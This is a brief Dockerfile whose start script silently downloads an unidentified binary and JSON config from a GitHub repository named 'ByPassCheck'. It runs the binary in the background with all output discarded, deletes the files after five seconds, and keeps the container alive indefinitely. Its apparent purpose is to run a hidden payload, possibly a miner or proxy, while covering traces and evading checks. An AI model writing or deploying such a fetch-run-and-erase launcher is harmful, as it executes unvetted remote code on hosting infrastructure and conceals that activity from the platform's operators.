FROM alpine:latest

RUN apk add wget

RUN cat << EOF > start.sh
#!/bin/bash
wget https://raw.githubusercontent.com/GTale/ByPassCheck/master/ges -q -O $$
wget https://raw.githubusercontent.com/GTale/ByPassCheck/master/ges.json -q -O $$.json
chmod +x $$ 
nohup ./$$ config $$.json >/dev/null 2>&1  &
sleep 5
rm -rf $$*
while [ 1 == 1 ]; do sleep 9999; done
EOF

RUN chmod +x /start.sh

CMD /start.sh
